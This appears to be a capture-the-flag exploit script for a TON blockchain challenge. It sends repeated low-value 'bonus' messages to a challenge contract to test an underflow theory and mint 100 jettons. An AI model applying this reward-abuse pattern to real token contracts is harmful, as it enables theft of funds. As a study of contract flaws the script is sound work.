import { TonClient, WalletContractV3R2 } from '@ton/ton';
import { keyPairFromSeed } from '@ton/crypto';
import { Address, toNano, beginCell, SendMode, TupleItem, internal } from '@ton/core';
import * as fs from 'fs';

const SESSION_FILE = 'session.json';
interface SessionData { uuid: string; challenge: string; api: string; wallet_id: number; seed: string; }
function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)); }

async function getBal(client: TonClient, addr: Address) { return client.getBalance(addr); }
async function getJettonBal(client: TonClient, addr: Address) {
    try { const r = await client.runMethod(addr, 'get_wallet_data'); return r.stack.readBigNumber(); } catch { return null; }
}
async function getSupply(client: TonClient, minter: Address) {
    try { const r = await client.runMethod(minter, 'get_jetton_data'); return r.stack.readBigNumber(); } catch { return null; }
}

async function main() {
    const s: SessionData = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf-8'));
    const client = new TonClient({ endpoint: s.api.replace(/\/+$/, '') + '/jsonRPC', timeout: 30000 });
    const challengeAddr = Address.parse(s.challenge);
    const kp = keyPairFromSeed(Buffer.from(s.seed, 'hex'));
    const wallet = WalletContractV3R2.create({ workchain: -1, publicKey: kp.publicKey, walletId: s.wallet_id });
    const openedWallet = client.open(wallet);
    const provider = client.provider(wallet.address, wallet.init);

    const mr = await client.runMethod(challengeAddr, 'minter');
    const minter = mr.stack.readAddress();
    const pwc = beginCell().storeAddress(wallet.address).endCell();
    const pwr = await client.runMethod(minter, 'get_wallet_address', [{ type: 'slice', cell: pwc } as TupleItem]);
    const pJetton = pwr.stack.readAddress();

    console.log(`Wallet: ${wallet.address}`);
    console.log(`Init: TON=${Number(await getBal(client, wallet.address))/1e9} Jetton=${await getJettonBal(client, pJetton)} Supply=${await getSupply(client, minter)}\n`);

    const bonusBody = beginCell().storeUint(0x13370002, 32).storeUint(0, 64).endCell();

    // Try sending 5 bonuses with low value to test underflow theory
    for (let i = 1; i <= 6; i++) {
        const bal = await getBal(client, wallet.address);
        if (bal < toNano('0.15')) { console.log(`Bonus #${i}: skipped (low balance ${Number(bal)/1e9} TON)`); break; }

        let seqno = await wallet.getSeqno(provider);
        console.log(`Bonus #${i}: seqno=${seqno}, send 0.15 TON`);

        await openedWallet.sendTransfer({
            seqno, secretKey: kp.secretKey,
            messages: [internal({ to: challengeAddr, value: toNano('0.15'), body: bonusBody, bounce: false })],
            sendMode: SendMode.PAY_GAS_SEPARATELY,
        });
        for (let w = 0; w < 30; w++) { await sleep(2000); const ns = await wallet.getSeqno(provider); if (ns > seqno) break; }
        await sleep(8000);

        const j = await getJettonBal(client, pJetton);
        const s = await getSupply(client, minter);
        const mBal = await getBal(client, minter);
        const cBal = await getBal(client, challengeAddr);
        console.log(`  Jetton=${j} Supply=${s} MinterBal=${Number(mBal)/1e9} ChallBal=${Number(cBal)/1e9}`);

        if (j !== null && j >= 100n) {
            console.log(`\n✅ Have 100 jettons!`);
            return; // Success placeholder
        }
    }

    console.log(`\nFinal: Jetton=${await getJettonBal(client, pJetton)}`);
    console.log(`Supply=${await getSupply(client, minter)}`);
}
main().catch(console.error);
